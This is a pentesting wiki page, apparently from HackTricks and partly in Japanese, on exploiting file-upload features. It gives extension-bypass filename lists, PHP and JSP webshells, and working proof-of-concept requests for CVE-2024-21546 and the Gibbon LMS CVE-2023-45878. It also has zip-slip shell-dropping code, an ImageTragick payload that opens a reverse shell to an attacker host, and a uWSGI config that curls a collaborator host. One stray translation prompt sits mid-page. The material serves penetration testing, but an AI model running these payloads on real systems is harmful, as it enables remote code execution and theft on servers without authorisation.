# ファイルアップロード

{{#include ../../banners/hacktricks-training.md}}

## ファイルアップロード 一般的な方法論

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### ファイル拡張子チェックのバイパス

1. 適用される場合は、**前述の拡張子を確認**してください。大文字も試してください: _pHp, .pHP5, .PhAr ..._
2. _実行拡張子の前に**有効な拡張子を追加する**ことを確認してください（前述の拡張子も使用）:_
- _file.png.php_
- _file.png.Php5_
3. 末尾に**特殊文字を追加**してみてください。Burpを使って**bruteforce**で**ascii**や**Unicode**文字を全て試すことができます。(_以前に示した**拡張子**を使うことも試せます_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. サーバ側の拡張子パーサを**騙して**保護をバイパスすることを試みてください。例えば、拡張子の**二重化 (doubling)** や拡張子間にゴミデータ（**null**バイト）を**挿入**するなどのテクニックです。_より良いペイロードを作るために前述の拡張子も利用できます。_
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. 前のチェックに**さらに拡張子の層**を追加してみてください:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. **実行用拡張子を有効な拡張子の前に置く**ことを試してください。サーバが誤設定されていれば実行される可能性があります（Apacheの誤設定を利用する際に有用で、拡張子に**.php**を含むものは必ずしも`.php`で終わらなくてもコードが実行される場合があります）:
- _ex: file.php.png_
7. **Windows**での NTFS alternate data stream (ADS) を利用する方法。禁止された拡張子の後と許可された拡張子の前にコロン ":" を挿入します。その結果、禁止された拡張子の**空ファイル**がサーバ上に作成されることがあります（例: "file.asax:.jpg"）。このファイルは後で短縮ファイル名など他の手法で編集される可能性があります。パターン "**::$data**" を使って非空ファイルを作成することもできます。したがって、このパターンの後にドットを追加することでも更なる制限を回避できる場合があります（例: "file.asp::$data."）。
8. ファイル名の長さ制限を破ってみてください。正しい拡張子が切り取られ、悪意あるPHPが残ることがあります。AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Some upload handlers trim or normalize trailing dot characters from the saved filename. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) versions before 2.9.1, you can bypass extension validation by:

- Using a valid image MIME and magic header (e.g., PNG’s `\x89PNG\r\n\x1a\n`).
- Naming the uploaded file with a PHP extension followed by a dot, e.g., `shell.php.`.
- The server strips the trailing dot and persists `shell.php`, which will execute if it’s placed in a web-served directory (default public storage like `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
次に、保存されたパスにアクセスします（Laravel + LFMで典型的）:
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- unisharp/laravel-filemanager を ≥ 2.9.1 にアップグレードする。
- サーバー側で厳格な allowlists を適用し、保存されたファイル名を再検証する。
- アップロードは非実行可能な場所から配信する。

### Content-Type, Magic Number, Compression & Resizing の回避

- Content-Type チェックを回避するには、**Content-Type** **header** の **value** を次のように設定する: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- ファイルの先頭に **実際の画像のバイト** を追加して **magic number** チェックを回避する（_file_ コマンドを混乱させる）。またはメタデータ内にシェルを挿入する:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` または画像に **直接ペイロードを挿入する** こともできる:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- 画像に **圧縮** が適用されている場合、例えば [PHP-GD](https://www.php.net/manual/fr/book.image.php) のような標準的な PHP ライブラリを使用していると、前述の手法は有効ではないことがある。しかし、**PLTE chunk** を利用する [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) を使えば、**圧縮を生き延びる** テキストを挿入できる。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- ウェブページが PHP-GD の `imagecopyresized` や `imagecopyresampled` といった関数で **image をリサイズ** している場合もある。しかし、**IDAT chunk** を利用する [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) を使えば、**圧縮を生き延びる** テキストを挿入できる。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- PHP-GD の `thumbnailImage` を使ったリサイズを生き残るペイロードを作る別の手法もある。しかし、**tEXt chunk** を利用する [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) を使えば、**圧縮を生き延びる** テキストを挿入できる。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- 既にアップロードされたファイルの **rename** を引き起こす脆弱性を探す（拡張子を変更するため）。
- Local File Inclusion の脆弱性を見つけてバックドアを実行する。
- **Possible Information disclosure**:
1. 同じファイルを**複数回**（かつ**同時に**）同じ名前でアップロードする。
2. 既に存在するファイルやフォルダと同じ**名前**のファイルをアップロードする。
3. ファイル名を **"." , "..", or "…"** にしてアップロードする。例えば、Apache を **Windows** で動かしていて、アプリケーションがアップロードを "/www/uploads/" に保存する場合、"." というファイル名は "/www/" ディレクトリに uploads” というファイルを作成する。
4. **NTFS** 上で削除されにくい **"…:.jpg"** のようなファイルをアップロードする。（Windows）
5. **Windows** で `|<>*?”` のような無効な文字を含むファイル名のファイルをアップロードする。（Windows）
6. **Windows** で CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9 のような予約（禁止）名を使用してファイルをアップロードする。
- また、実行ファイル（.exe）や、被害者が誤って開いたときにコードを実行する **.html**（疑われにくい）をアップロードしてみる。

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` ファイルは `.jar`（java）のようなもので、php 向けのものであり、**php ファイルのように使用できる**（php で実行したり、スクリプト内で include したり...）。

`.inc` 拡張子は、ファイルのインポートにのみ使われる php ファイルに使われることがあり、そのため、ある時点でこの拡張子が **実行可能に許可されている** ことがある。

## **Jetty RCE**

Jetty サーバーに XML ファイルをアップロードできれば、[RCE を得られる（**new *.xml and *.war are automatically processed**）](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)。したがって、以下の画像で示されているように、XML ファイルを `$JETTY_BASE/webapps/` にアップロードすればシェルが得られる可能性がある！

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) 脆弱性は、`.ini` 設定ファイルを変更する能力がある場合、uWSGI サーバーで悪用され得る。uWSGI の設定ファイルは、"magic" 変数、プレースホルダー、演算子を組み込む特定の構文を利用している。特に、`@(filename)` として利用される '@' 演算子はファイルの内容を含めるために設計されている。uWSGI でサポートされるさまざまなスキームの中でも、"exec" スキームは特に強力で、プロセスの標準出力からデータを読み取ることを可能にする。この機能は、`.ini` 設定ファイルが処理される際に、Remote Command Execution や Arbitrary File Write/Read のような悪意ある目的に悪用され得る。

以下は、さまざまなスキームを示す悪意ある `uwsgi.ini` ファイルの例を考えてみる:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
ペイロードの実行は設定ファイルの解析中に発生します。設定を有効化して解析させるためには、uWSGI プロセスを再起動する必要がある（クラッシュ後や Denial of Service 攻撃の結果として再起動される可能性がある）か、ファイルが auto-reload に設定されている必要があります。auto-reload 機能が有効な場合、変更を検出すると指定間隔でファイルを再読み込みします。

uWSGI の設定ファイルの解析が緩い性質であることを理解することが重要です。具体的には、ここで説明した payload はバイナリファイル（画像や PDF など）に挿入でき、悪用の範囲をさらに広げます。

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Gibbon LMS の unauthenticated endpoint は web root 内への arbitrary file write を許可し、PHP ファイルを配置することで pre-auth RCE に至ります。影響を受けるバージョン: up to and including 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- 必要なパラメータ:
- `img`: data-URI-like string: `[mime];[name],[base64]` (サーバーは type/name を無視し、後半を base64 デコードします)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: 任意の非空の値が受け入れられます (例: `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
最小限のwebshellを設置してコマンドを実行する:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
注記:
- ハンドラは ';' と ',' で分割した後に `base64_decode($_POST["img"])` を実行し、拡張子/タイプを検証せずにバイトを `$absolutePath . '/' . $_POST['path']` に書き込みます。
- 結果として生成されるコードはウェブサービスのユーザ権限で実行されます（例: XAMPP Apache on Windows）。

このバグに関する参照には usd HeroLab advisory と NVD のエントリが含まれます。下の References セクションを参照してください。

## **wget File Upload/SSRF Trick**

場合によってはサーバが **`wget`** を使って **ファイルをダウンロード** しており、あなたが **URL** を **指定** できることがあります。こうした場合、ダウンロードされるファイルの拡張子がホワイトリストに含まれているかを確認して、許可されたファイルのみがダウンロードされるようにしているコードが存在することがあります。しかし、**このチェックは回避可能です。**\

linux における **最大** の **ファイル名** 長は **255** ですが、**wget** はファイル名を **236** 文字に切り詰めます。**"A"*232+".php"+".gif"** というファイルをダウンロードすると、このファイル名は（この例では **".gif"** が **有効** な拡張子であるため）**チェックをバイパス**しますが、`wget` はファイル名を **"A"*232+".php"** に**リネーム**します。
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **別のオプション**として考えられるのは、**HTTP server redirect to a different file** を行い、最初の URL がチェックを通過した後で wget がリダイレクト先のファイルを新しい名前でダウンロードするようにする方法です。これは wget が `--trust-server-names` パラメータを使用している場合を除いて**機能しません**。なぜなら **wget はリダイレクトされたページを元の URL で示されたファイル名でダウンロードする**からです。

### NTFS junctions (Windows) を使ったアップロードディレクトリの脱出

(この攻撃には対象の Windows マシンへのローカルアクセスが必要です) Windows 上でアップロードが per-user サブフォルダ（例: C:\Windows\Tasks\Uploads\<id>\）に保存され、あなたがそのサブフォルダの作成/削除を制御できる場合、そのサブフォルダを webroot などの敏感な場所を指す directory junction に置き換えることができます。その後のアップロードはターゲットパスに書き込まれ、ターゲットが server‑side code を解釈する場合に code execution を可能にします。

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
注記
- mklink /J creates an NTFS directory junction (reparse point). The web server’s account must follow the junction and have write permission in the destination.
- これにより任意のファイル書き込みがリダイレクトされます。宛先がスクリプト (PHP/ASP) を実行する場合、RCE になります。
- 防御: writable upload roots を攻撃者が制御できるように C:\Windows\Tasks 等の下に配置しないこと; junction 作成をブロックする; 拡張子をサーバー側で検証する; アップロードは別ボリュームに保存するか deny‑execute ACLs を設定する。

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

一部の upload/ingest handlers は、生のリクエストボディをユーザ制御のクエリパラメータから構築されたファイルシステムパスに書き込みます。ハンドラが Content-Encoding: gzip をサポートし、かつ destination path を正規化/検証しない場合、directory traversal と gzipped payload を組み合わせて web-served directory に任意のバイトを書き込み、RCE を取得できます（例: Tomcat の webapps に JSP を置く）。

Generic exploitation flow:
- サーバー側のペイロード（例: minimal JSP webshell）を準備し、バイト列を gzip 圧縮します。
- 意図したフォルダを抜ける traversal を含む path parameter（例: token）と、保存するファイル名を示す file を含む POST を送信します。Content-Type: application/octet-stream と Content-Encoding: gzip を設定し、body に圧縮ペイロードを置きます。
- 書き込まれたファイルにアクセスして実行をトリガーします。

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
README.md の内容をここに貼ってください。タグやリンク、パスはそのまま保持して翻訳します。
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
ノート
- Target paths vary by install (e.g., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in some stacks). Any web-exposed folder that executes JSP will work.
- Burp Suite’s Hackvertor extension can produce a correct gzip body from your payload.
- This is a pure pre-auth arbitrary file write → RCE pattern; it does not rely on multipart parsing.

軽減策
- サーバー側で upload destinations を決定すること。クライアントからの path fragments を決して信頼しない。
- 解決されたパスが allow-listed な基底ディレクトリ内に留まるように正規化し、強制する。
- アップロードを実行不可のボリュームに保存し、書き込み可能なパスからのスクリプト実行を拒否する。

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Corrupting upload indices with snprintf quirks (historical)

一部のレガシーな upload handlers は、`snprintf()` や類似の関数で single-file upload から multi-file 配列を構築しており、これらは `_FILES` 構造を偽造するように騙されることがあります。`snprintf()` の挙動の不整合や切り捨てにより、慎重に作られた single upload がサーバー側で複数の indexed files として現れ、厳密な形状を前提とするロジック（例：multi-file upload と見なして unsafe な分岐を取る）が混乱する可能性があります。今日ではニッチですが、この「index corruption」パターンは CTF や古いコードベースで時折再出現します。

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

以下はアップロードによって達成できるトップ10の例です（[here](https://twitter.com/SalahHasoneh1/status/1281274120395685889) より）:

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 別フォルダに展開

解凍時にディレクトリ内にファイルが予期せず作成されることは重大な問題です。この設定が悪意のあるファイルアップロードによるOSレベルのコマンド実行から保護すると当初は考えられていても、ZIPアーカイブ形式の階層的圧縮対応やディレクトリトラバーサル機能は悪用され得ます。これにより攻撃者は、対象アプリケーションの解凍機能を操作して制限を回避し、セキュアなアップロードディレクトリから脱出できます。

そのようなファイルを作成する自動エクスプロイトが[**evilarc on GitHub**](https://github.com/ptoomey3/evilarc)で入手可能です。ユーティリティは以下のように使用できます：
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
さらに、**symlink trick with evilarc** も選択肢です。`/flag.txt` のようなファイルを狙う場合は、そのファイルへの symlink をシステム上に作成してください。これにより evilarc が動作中にエラーを起こさないようにできます。

以下は、悪意のある zip ファイルを作成するために使用する Python コードの例です:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**圧縮の悪用（file spraying）**

詳細については **元の投稿を確認してください**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP コードは `$_REQUEST` 変数を通じて渡されたコマンドを実行するように書かれています。

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: 複数のファイルが作成され、これらのファイルを含む zip アーカイブが組み立てられます。

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip 内のファイル名を vi や Hex Editor を使って変更し、ディレクトリを横断するために "xxA" を "../" に置換します。

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

このコンテンツを画像拡張子でアップロードすると脆弱性を悪用できます **(ImageMagick , 7.0.1-1)** （詳細は [exploit](https://www.exploit-db.com/exploits/39767)）
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNGへのPHP Shellの埋め込み

PNGファイルのIDATチャンクにPHP Shellを埋め込むことで、特定の画像処理を回避できる場合があります。PHP-GDの`imagecopyresized`や`imagecopyresampled`といった関数は、画像のリサイズやリサンプリングでよく使われるため、本手法において特に重要です。埋め込まれたPHP Shellがこれらの処理によって影響を受けずに残る能力は、特定のユースケースで大きな利点となります。

この手法の詳細な検証、方法論や応用例については次の記事を参照してください: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)。この記事はプロセスとその意味合いを包括的に解説しています。

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglotファイル

Polyglotファイルは、複数のファイル形式として同時に有効に存在できる「カメレオン」のようなユニークなツールです。興味深い例としては、GIFとRARの両方として機能する[GIFAR](https://en.wikipedia.org/wiki/Gifar)があります。これらはGIFとRARの組み合わせに限らず、GIFとJSやPPTとJSのような組み合わせも実現可能です。

ポリグロットファイルの主な有用性は、ファイルタイプに基づいてスクリーニングするセキュリティ対策を回避できる点にあります。多くのアプリケーションでは、アップロードを許可するファイルタイプをJPEG、GIF、DOCなどに限定して、JSやPHP、Pharのような潜在的に有害な形式のリスクを低減しています。しかし、ポリグロットは複数のファイル形式の構造的基準を満たすことで、これらの制限を巧妙に回避することができます。

ただし、ポリグロットには制限もあります。例えば、ポリグロットがPHARファイル（PHp ARchive）とJPEGの両方の特性を持っていたとしても、アップロードの成功はプラットフォームのファイル拡張子ポリシーに依存することがあります。システムが許可される拡張子に厳格な場合、ポリグロットの構造的二重性だけではアップロードを保証できない可能性があります。

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDFを装って有効なJSONをアップロードする方法

有効なJSONファイルをPDFに偽装してアップロード制限を回避する方法（**[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)** の手法）:

- **`mmmagic` library**: `%PDF` のマジックバイトが最初の1024バイト以内にあれば有効と判定される（詳細な例は記事参照）
- **`pdflib` library**: JSON内のあるフィールドに偽のPDFフォーマットを追加して、ライブラリにPDFと判断させる（詳細な例は記事参照）
- **`file` binary**: ファイルから最大1048576バイトを読み取る。これより大きなJSONを作成してcontentをJSONとして解析できないようにし、その中に本物のPDFの先頭部分を入れるとPDFと判定される

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
